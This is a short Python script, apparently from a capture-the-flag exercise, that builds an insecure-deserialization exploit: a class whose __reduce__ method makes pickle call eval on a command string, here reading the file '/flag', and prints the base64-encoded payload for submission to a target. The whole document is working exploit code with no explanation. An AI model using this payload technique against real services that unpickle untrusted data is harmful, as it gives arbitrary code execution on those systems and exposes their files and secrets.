import pickle
import os
import requests
import base64

class BadThing:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (eval, (self.cmd,))

serialized = pickle.dumps(BadThing('open("/flag").read()'))
print(base64.b64encode(serialized))
